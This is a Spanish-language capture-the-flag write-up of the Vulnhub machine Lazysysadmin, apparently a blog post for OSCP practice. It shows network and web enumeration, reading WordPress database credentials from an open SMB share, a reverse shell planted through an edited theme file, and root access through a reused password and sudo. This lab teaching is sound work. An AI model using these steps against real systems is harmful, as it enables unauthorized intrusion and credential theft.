---
title: Lazysysadmin Writeup - Vulnhub
date: 2025-02-12
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Lazysysadmin, OSCP Prep, smbmap, Wordpress]
image:
  path: /assets/img/commons/vulnhub/lazysysadmin/portada.png
---

Anterior [*OSCP Lab 3*](https://lvs3c.github.io/posts/OSCP-SickOs1.1/)

¡Saludos!

**`OSCP Lab 4`**

En este writeup, realizaremos la máquina [**Lazysysadmin**](https://www.vulnhub.com/entry/lazysysadmin-1,205/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **smbmap** para obtener archivos compartidos y acceso al CMS.
- Mediante **Wordpress** obtener la reverse shell.
- **User pivoting** con los datos obtenidos de un archivo.
- Y por último, tenemos permisos full del usuario sobre el OS, con lo cual podemos convertirnos en root y obtener la flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
[sudo] password for lvs3c:
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.16     00:0c:29:06:ad:d3       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.653 seconds (96.49 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.16
PING 10.11.12.16 (10.11.12.16) 56(84) bytes of data.
64 bytes from 10.11.12.16: icmp_seq=1 ttl=64 time=0.650 ms

--- 10.11.12.16 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.650/0.650/0.650/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.16 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 20:14 -03
Nmap scan report for 10.11.12.16
Host is up (0.0098s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
MAC Address: 00:0C:29:06:AD:D3 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p22,80,139,445,3306,6667 -sCV 10.11.12.16 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 20:15 -03
Nmap scan report for 10.11.12.16
Host is up (0.00034s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Backnode
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-generator: Silex v2.2.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 10.11.12.10
|_  error: Closing link: (nmap@10.11.12.10) [Client exited]
MAC Address: 00:0C:29:06:AD:D3 (VMware)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -8h32m36s, deviation: 5h46m24s, median: -5h12m36s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2025-02-13T04:03:26+10:00
| smb2-time:
|   date: 2025-02-12T18:03:26
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.89 secon
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 6.6.1p1`.
- Puerto `80` servidor `Apache httpd 2.4.7`.
- Puerto `139` servidor `Samba smbd 3.X - 4.X`.
- Puerto `445` servidor `Samba smbd 4.3.11-Ubuntu`.
- Puerto `3306` servidor `MySQL`.
- Puerto `6667` servidor `InspIRCd`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.16/
http://10.11.12.16/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.11.12.16], JQuery, MetaGenerator[Silex v2.2.7], PoweredBy[-,Silex], Script[text/javascript], Title[Backnode]
```

![web](/assets/img/commons/vulnhub/lazysysadmin/web.png){: .center-image }

Sabemos por nmap que hay un archivo robots.txt con 4 entradas.

`http-robots.txt: 4 disallowed entries: /old/ /test/ /TR2/ /Backnode_files/`

Dichas entradas no contienen información relevante.

Continuamos realizando fuzzing de directorios con el script `http-enum` de nmap para obtener más resultados.

```bash
❯ nmap -p80 --script http-enum 10.11.12.16 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 20:26 -03
Nmap scan report for 10.11.12.16
Host is up (0.00034s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wordpress/: Blog
|   /test/: Test page
|   /robots.txt: Robots file
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|   /apache/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /old/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds
```

Tenemos varios directorios más, al parecer estamos frente a `CMS Wordpress`.

Antes de indagar en los directorios encontrados, vamos a continuar con el fuzzing de directorios y archivos utilizando `gobuster`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.12.16 -e -x php,txt,zip,bak,bkp --add-slash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bak,bkp
[+] Add Slash:               true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.16/.php/                (Status: 403) [Size: 283]
http://10.11.12.16/icons/               (Status: 403) [Size: 284]
http://10.11.12.16/info.php/            (Status: 200) [Size: 77470]
http://10.11.12.16/test/                (Status: 200) [Size: 735]
http://10.11.12.16/wordpress/           (Status: 200) [Size: 11727]
http://10.11.12.16/wp/                  (Status: 200) [Size: 731]
http://10.11.12.16/apache/              (Status: 200) [Size: 739]
http://10.11.12.16/old/                 (Status: 200) [Size: 733]
http://10.11.12.16/javascript/          (Status: 403) [Size: 289]
http://10.11.12.16/phpmyadmin/          (Status: 200) [Size: 8260]
http://10.11.12.16/.php/                (Status: 403) [Size: 283]
http://10.11.12.16/server-status/       (Status: 403) [Size: 292]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.12.16 -e -x php,txt,zip,bak,bkp
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bak,bkp
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.16/.php                 (Status: 403) [Size: 282]
http://10.11.12.16/info.php             (Status: 200) [Size: 77150]
http://10.11.12.16/wordpress            (Status: 301) [Size: 313] [--> http://10.11.12.16/wordpress/]
http://10.11.12.16/test                 (Status: 301) [Size: 308] [--> http://10.11.12.16/test/]
http://10.11.12.16/wp                   (Status: 301) [Size: 306] [--> http://10.11.12.16/wp/]
http://10.11.12.16/apache               (Status: 301) [Size: 310] [--> http://10.11.12.16/apache/]
http://10.11.12.16/old                  (Status: 301) [Size: 307] [--> http://10.11.12.16/old/]
http://10.11.12.16/javascript           (Status: 301) [Size: 314] [--> http://10.11.12.16/javascript/]
http://10.11.12.16/robots.txt           (Status: 200) [Size: 92]
http://10.11.12.16/phpmyadmin           (Status: 301) [Size: 314] [--> http://10.11.12.16/phpmyadmin/]
http://10.11.12.16/.php                 (Status: 403) [Size: 282]
http://10.11.12.16/server-status        (Status: 403) [Size: 291]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

Tenemos varias cosas para revisar, como el archivo `php.info` y el directorio `phpmyadmin`. Nos vamos a concentrar en el directorio `wordpress` que contiene el `CMS`{: .filepath}.

![wordpress](/assets/img/commons/vulnhub/lazysysadmin/wordpress.png){: .center-image }
![wordpressv](/assets/img/commons/vulnhub/lazysysadmin/wordpressv.png){: .normal }

Como sabemos, el panel de login de Wordpress está en `/wp-admin` o `/wp-login`. Probamos `admin/admin` pero no podemos ingresar, igualmente validamos que `admin` es un usuario válido.

![adminlogin](/assets/img/commons/vulnhub/lazysysadmin/adminlogin.png){: .center-image }


En este punto podríamos realizar fuerza bruta con hydra, lo dejamos para más adelante si no encontramos información.

Vamos a investigar el puerto `445 - SMB`, por si encontramos más información compartida.


### SMB - 445

Vamos a utilizar la herramienta `smbmap`, la cual es excelente porque nos muestra los permisos sobre los directorios.

Listamos los recursos compartidos.

```bash
❯ smbmap -H 10.11.12.16
[+] Guest session       IP: 10.11.12.16:445     Name: 10.11.12.16
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        share$                                                  READ ONLY       Sumshare
        IPC$                                                    NO ACCESS       IPC Service (Web server)
```

Tenemos acceso de sólo lectura sobre `share$`. Listamos el contenido.

```bash
❯ smbmap -H 10.11.12.16 -r share$
[+] Guest session       IP: 10.11.12.16:445     Name: 10.11.12.16
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        share$                                                  READ ONLY
        .\share$\*
        dr--r--r--                0 Tue Aug 15 08:05:52 2017    .
        dr--r--r--                0 Mon Aug 14 09:34:47 2017    ..
        dr--r--r--                0 Tue Aug 15 08:21:08 2017    wordpress
        dr--r--r--                0 Mon Aug 14 09:08:26 2017    Backnode_files
        dr--r--r--                0 Tue Aug 15 07:51:23 2017    wp
        fr--r--r--              139 Mon Aug 14 09:20:05 2017    deets.txt
        fr--r--r--               92 Mon Aug 14 09:36:14 2017    robots.txt
        fr--r--r--               79 Mon Aug 14 09:39:56 2017    todolist.txt
        dr--r--r--                0 Mon Aug 14 09:35:19 2017    apache
        fr--r--r--            36072 Sun Aug  6 02:02:14 2017    index.html
        fr--r--r--               20 Tue Aug 15 07:55:19 2017    info.php
        dr--r--r--                0 Mon Aug 14 09:35:10 2017    test
        dr--r--r--                0 Mon Aug 14 09:35:13 2017    old
```

Validamos el contenido del archivo `deets.txt` y nombra una password, la cual vamos a tener en cuenta más adelante.

![deets](/assets/img/commons/vulnhub/lazysysadmin/deets.png){: .center-image }

Además, nos damos cuenta que estamos viendo el contenido de la web, listados el direcotorio `wordpress`.

```bash
❯ smbmap -H 10.11.12.16 -r share$/wordpress
[+] Guest session       IP: 10.11.12.16:445     Name: 10.11.12.16
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        share$                                                  READ ONLY
        .\share$wordpress\*
        dr--r--r--                0 Tue Aug 15 08:21:08 2017    .
        dr--r--r--                0 Tue Aug 15 08:05:52 2017    ..
        fr--r--r--             2853 Wed Dec 16 06:58:25 2015    wp-config-sample.php
        fr--r--r--             4513 Fri Oct 14 16:39:27 2016    wp-trackback.php
        dr--r--r--                0 Wed Aug  2 18:02:01 2017    wp-admin
        fr--r--r--            16200 Thu Apr  6 15:01:41 2017    wp-settings.php
        fr--r--r--              364 Sat Dec 19 08:20:27 2015    wp-blog-header.php
        fr--r--r--              418 Tue Sep 24 21:18:10 2013    index.php
        fr--r--r--             3286 Sun May 24 14:26:24 2015    wp-cron.php
        fr--r--r--             2422 Sun Nov 20 23:46:29 2016    wp-links-opml.php
        fr--r--r--             7413 Mon Dec 12 05:01:38 2016    readme.html
        fr--r--r--            29924 Tue Jan 24 08:08:41 2017    wp-signup.php
        dr--r--r--                0 Mon Aug 21 07:07:27 2017    wp-content
        fr--r--r--            19935 Mon Jan  2 14:58:41 2017    license.txt
        fr--r--r--             8048 Wed Jan 11 02:13:42 2017    wp-mail.php
        fr--r--r--             5447 Tue Sep 27 18:36:27 2016    wp-activate.php
        fr--r--r--               35 Tue Aug 15 08:40:13 2017    .htaccess
        fr--r--r--             3065 Wed Aug 31 13:31:28 2016    xmlrpc.php
        fr--r--r--            34327 Fri May 12 14:12:45 2017    wp-login.php
        fr--r--r--             3301 Tue Oct 25 00:15:29 2016    wp-load.php
        fr--r--r--             1627 Mon Aug 29 09:00:31 2016    wp-comments-post.php
        fr--r--r--             3703 Mon Aug 21 06:25:14 2017    wp-config.php
        dr--r--r--                0 Wed Aug  2 18:02:02 2017    wp-includes
```

La configuración del sitio se encuentra en el archivo `wp-config-php`, lo descargamos y verificamos su contenido buscando la password de admin.

```bash
❯ smbmap -H 10.11.12.16 --download share$/wordpress/wp-config.php
[+] Starting download: share$\wordpress\wp-config.php (3703 bytes)
[+] File output to: /home/lvs3c/CTF/VulnHub/Lazysysadmin/10.11.12.16/content/10.11.12.16-share_wordpress_wp-config.php

❯ cat 10.11.12.16-share_wordpress_wp-config.php
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 10.11.12.16-share_wordpress_wp-config.php
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ /**
   3   │  * The base configuration for WordPress
   4   │  *
   5   │  * The wp-config.php creation script uses this file during the
   6   │  * installation. You don't have to use the web site, you can
   7   │  * copy this file to "wp-config.php" and fill in the values.
   8   │  *
   9   │  * This file contains the following configurations:
  10   │  *
  11   │  * * MySQL settings
  12   │  * * Secret keys
  13   │  * * Database table prefix
  14   │  * * ABSPATH
  15   │  *
  16   │  * @link https://codex.wordpress.org/Editing_wp-config.php
  17   │  *
  18   │  * @package WordPress
  19   │  */
  20   │
  21   │ // ** MySQL settings - You can get this info from your web host ** //
  22   │ /** The name of the database for WordPress */
  23   │ define('DB_NAME', 'wordpress');
  24   │
  25   │ /** MySQL database username */
  26   │ define('DB_USER', 'Admin');
  27   │
  28   │ /** MySQL database password */
  29   │ define('DB_PASSWORD', 'TogieMYSQL12345^^');
  30   │
  31   │ /** MySQL hostname */
  32   │ define('DB_HOST', 'localhost');
  33   │
  34   │ /** Database Charset to use in creating database tables. */
  35   │ define('DB_CHARSET', 'utf8');
```

Probamos conectarnos al panel de login con user admin y password `TogieMYSQL12345^^` .

Ganamos acceso al portal.

![login_panel](/assets/img/commons/vulnhub/lazysysadmin/login_panel.png){: .center-image }

## Explotación

---

En este punto, nuestro objetivo es ingresar a la máquina víctima, vamos a manipular algún archivo de configuración añadiendo nuestro código.

Utilizamos el archivo del tema `404.php`.

![reverse](/assets/img/commons/vulnhub/lazysysadmin/reverse.png){: .center-image }

Tenemos ejecución de código.

![rce](/assets/img/commons/vulnhub/lazysysadmin/rce.png){: .normal }

Lanzamos una reverse shell y ganamos acceso al servidor.

![access](/assets/img/commons/vulnhub/lazysysadmin/access.png){: .normal }

```bash
❯ sudo rlwrap nc -nlvp 9999
[sudo] password for lvs3c:
listening on [any] 443 ...

connect to [10.11.12.10] from (UNKNOWN) [10.11.12.16] 53482
bash: cannot set terminal process group (1182): Inappropriate ioctl for device
bash: no job control in this shell
www-data@LazySysAdmin:/var/www/html/wordpress$ whoami
whoami
www-data
```

Con este acceso, podemos listar y explotar el sistema operativo de varias formas, pero hay una forma más sencilla.

## Escalación de privilegios

---

Usando la password del archivo `deets.txt`, intentamos loguearnos con el usuario `togie`.

```bash
❯ ssh togie@10.11.12.16
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         #
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   #
##################################################################################################

togie@10.11.12.16's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Feb 13 21:06:06 AEST 2025

  System load:  0.0               Processes:           196
  Usage of /:   56.8% of 2.89GB   Users logged in:     0
  Memory usage: 25%               IP address for eth0: 10.11.12.16
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

133 packages can be updated.
0 updates are security updates.

togie@LazySysAdmin:~$
```

Validamos los permisos del usuario sobre el OS y tenemos permisos FULL.

```bash
togie@LazySysAdmin:~$ sudo -l
[sudo] password for togie:
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
togie@LazySysAdmin:~$
```

Listamos la Flag.

```bash
togie@LazySysAdmin:~$ sudo su
root@LazySysAdmin:/home/togie# cd /root
root@LazySysAdmin:~# ls
proof.txt
root@LazySysAdmin:~# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
root@LazySysAdmin:~#
```

Hope it helps!